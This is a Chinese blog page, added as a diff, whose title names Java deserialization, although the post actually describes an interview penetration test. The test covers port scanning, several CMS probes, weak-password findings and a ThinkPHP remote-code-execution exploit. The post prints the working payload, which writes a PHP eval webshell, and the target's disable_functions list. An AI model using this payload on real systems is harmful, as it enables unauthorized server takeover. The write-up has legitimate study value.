@@ -1,0 +1,229 @@
+
+<!DOCTYPE html>
+<html lang="zh-Hans" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Java反序列化回显解决方案 - 像清水一般清澈透明</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="清水Samny,"> 
+    <meta name="description" content="前期–信息收集&amp;emsp;&amp;emsp; 面试官给了一个ip地址，然后首先肯定得信息收集。发现几个端口都是开放的。
+80端口
+81端口–Gxlcms听书这个cms百度到很多漏洞，但是决定好麻烦，然后就,"> 
+    <meta name="author" content="Samny"> 
+    <link rel="alternative" href="atom.xml" title="像清水一般清澈透明" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+    <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads"
+        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+<meta name="generator" content="Hexo 4.1.1"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">像清水一般清澈透明</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="icon-home image-icon" href="javascript:;" data-url="http://yoursite.com"></a>
+    <div title="播放/暂停" class="icon-play"></div>
+    <h3 class="subtitle">Java反序列化回显解决方案</h3>
+    <div class="social">
+        <!--<div class="like-icon">-->
+            <!--<a href="javascript:;" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a>-->
+        <!--</div>-->
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">Java反序列化回显解决方案</h1>
+        <div class="stuff">
+            <span>六月 01, 2020</span>
+            
+
+        </div>
+        <div class="content markdown">
+            <h1 id="前期–信息收集"><a href="#前期–信息收集" class="headerlink" title="前期–信息收集"></a>前期–信息收集</h1><p>&emsp;&emsp; 面试官给了一个ip地址，然后首先肯定得信息收集。发现几个端口都是开放的。<br><img src="https://img-blog.csdnimg.cn/20200601212306474.png" alt="在这里插入图片描述"></p>
+<h2 id="80端口"><a href="#80端口" class="headerlink" title="80端口"></a>80端口</h2><p><img src="https://img-blog.csdnimg.cn/20200601212548908.png" alt="在这里插入图片描述"></p>
+<h2 id="81端口–Gxlcms听书"><a href="#81端口–Gxlcms听书" class="headerlink" title="81端口–Gxlcms听书"></a>81端口–Gxlcms听书</h2><p>这个cms百度到很多漏洞，但是决定好麻烦，然后就看了一眼放弃了这条路。找到后台，跑很久的绕口令没进去。<br><img src="https://img-blog.csdnimg.cn/20200601212630643.png" alt="在这里插入图片描述"></p>
+<hr>
+<h2 id="82端口–CLTPHP内容管理系统"><a href="#82端口–CLTPHP内容管理系统" class="headerlink" title="82端口–CLTPHP内容管理系统"></a>82端口–CLTPHP内容管理系统</h2><p>百度相关cms漏洞–发现前台可以getshell<a href="https://blog.csdn.net/qq_23936389/article/details/84967363" target="_blank" rel="noopener">漏洞复现文章地址</a>，尝试复现，发现不能上传似乎是改了，做了限制。<br><img src="https://img-blog.csdnimg.cn/20200601212747453.png" alt="在这里插入图片描述"><br>用bbscan扫出后台地址，在测试弱口令的时候，xray是挂着的。<br><img src="https://img-blog.csdnimg.cn/20200601213438891.png" alt="在这里插入图片描述"><br>然后xray测出绕口令。<br><img src="https://img-blog.csdnimg.cn/20200601213507742.png" alt="在这里插入图片描述"><br>在后台上传头像地方，发现做了白名单限制，测试一段时间后放弃了。<br><img src="https://img-blog.csdnimg.cn/20200601213310636.png" alt="在这里插入图片描述"></p>
+<hr>
+<h2 id="83端口–Joomla"><a href="#83端口–Joomla" class="headerlink" title="83端口–Joomla"></a>83端口–Joomla</h2><p>忘记测试了。<br><img src="https://img-blog.csdnimg.cn/20200601223207562.png" alt="在这里插入图片描述"></p>
+<hr>
+<h2 id="84端口–DSMALL德善商城"><a href="#84端口–DSMALL德善商城" class="headerlink" title="84端口–DSMALL德善商城"></a>84端口–DSMALL德善商城</h2><p><img src="https://img-blog.csdnimg.cn/20200601212855388.png" alt="在这里插入图片描述"><br>测试其他端口网站时，回头看了一眼xray报告，挖到thinkphp的rce。<br><img src="https://img-blog.csdnimg.cn/20200601213926864.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200603092754750.png" alt="在这里插入图片描述"><br>查看phpinfo信息，找到<code>disable_functions</code>。最后对比发现没禁<code>file_put_contents</code>函数，最终getshell。</p>
+<blockquote>
+<p>passthru,exec,system,putenv,chroot,chgrp,chown,shell_exec,popen,proc_open,pcntl_exec,ini_alter,ini_restore,dl,openlog,syslog,readlink,symlink,popepassthru,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,imap_open,apache_setenv</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/20200601214359261.png" alt="在这里插入图片描述"></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">_method=__construct&amp;filter[]=assert&amp;method=<span class="built_in">get</span>&amp;server[REQUEST_METHOD]=file_put_contents(%<span class="number">27</span>test.php%<span class="number">27</span>,%<span class="number">27</span>%<span class="number">3</span>C?php%<span class="number">20</span>eval($_POST[<span class="number">1</span>])?%<span class="number">3</span>E%<span class="number">27</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">_method=__construct&amp;filter[]=assert&amp;method=get&amp;server[REQUEST_METHOD]=file_put_contents('test.php','&lt;?php eval($_POST[1])?&gt;');</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/20200601214301214.png" alt="在这里插入图片描述"><br>最后用蚁剑连上shell。<br><img src="https://img-blog.csdnimg.cn/2020060121471369.png" alt="在这里插入图片描述"></p>
+<hr>
+<h1 id="拿shell番外篇"><a href="#拿shell番外篇" class="headerlink" title="拿shell番外篇"></a>拿shell番外篇</h1><p>&emsp;&emsp; 在拿shell的时候，百度了某师傅的一篇文章，用session+远程文件包含getshell，但是失败了，问了某师傅可能是因为没权限执行命令。<br><a href="https://glotozz.github.io/2020/05/17/%E8%AE%B0%E4%B8%80%E6%AC%A1SRC%E6%8C%96%E6%B4%9E/" target="_blank" rel="noopener">https://glotozz.github.io/2020/05/17/%E8%AE%B0%E4%B8%80%E6%AC%A1SRC%E6%8C%96%E6%B4%9E/</a><br><a href="https://xz.aliyun.com/t/6106#toc-1" target="_blank" rel="noopener">https://xz.aliyun.com/t/6106#toc-1</a></p>
+<hr>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="true">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='https://link.hhtjim.com/163/574566207.mp3'></li>
+                        
+                    
+                        
+                            <li title='1' data-url='https://link.hhtjim.com/qq/playsong.mp3'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+        data-ae='true'
+        data-ci='a69212da3fc88cd39af9'
+        data-cs='19e2c5d71620cb7b14d99a908f8134be70bd83fa'
+        data-r='gittalksamny'
+        data-o='samny520'
+        data-a='samny520'
+        data-d='true'
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class='side'>
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前期–信息收集"><span class="toc-number">1.</span> <span class="toc-text">前期–信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#80端口"><span class="toc-number">1.1.</span> <span class="toc-text">80端口</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#81端口–Gxlcms听书"><span class="toc-number">1.2.</span> <span class="toc-text">81端口–Gxlcms听书</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#82端口–CLTPHP内容管理系统"><span class="toc-number">1.3.</span> <span class="toc-text">82端口–CLTPHP内容管理系统</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#83端口–Joomla"><span class="toc-number">1.4.</span> <span class="toc-text">83端口–Joomla</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#84端口–DSMALL德善商城"><span class="toc-number">1.5.</span> <span class="toc-text">84端口–DSMALL德善商城</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#拿shell番外篇"><span class="toc-number">2.</span> <span class="toc-text">拿shell番外篇</span></a></li></ol>
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+<span id="busuanzi_container_page_pv">
+   本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+</span>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/diaspora.js"></script>
+<script src="/js/snow.js"></script>
+<script src="/js/test.js"></script>
+<script src="/js/tx.js"></script>
+<script src="/js/x.js"></script>
+<script src="/js/xiantiao.js"></script>
+<script src="/js/baidu.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+<!-- 在想要使用窗口小部件的地方插入该标签 -->
+<iframe width="900" height="401" src="https://cybermap.kaspersky.com/cn/widget/dynamic/dark" frameborder="0">
+
+
+<script type="text/javascript" src="//rf.revolvermaps.com/0/0/6.js?i=5jbaycl6wsf&amp;m=7&amp;c=e63100&amp;cr1=ffffff&amp;f=arial&amp;l=0&amp;bv=90&amp;lx=-420&amp;ly=420&amp;hi=20&amp;he=7&amp;hc=a8ddff&amp;rs=80" async="async"></script>
+
+
+
+
+<!-- Google Analytics -->
+<script type="text/javascript">
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+  ga('create', '218065278', 'auto');
+  ga('send', 'pageview');
+</script>
+<!-- End Google Analytics -->
+
+
+</html>
